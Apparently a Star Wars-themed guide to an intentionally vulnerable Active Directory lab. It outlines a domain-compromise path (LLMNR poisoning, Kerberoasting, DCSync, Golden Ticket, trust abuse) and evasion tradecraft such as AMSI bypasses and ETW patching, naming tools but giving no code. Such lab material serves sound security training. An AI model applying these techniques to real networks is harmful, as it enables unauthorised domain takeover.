* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
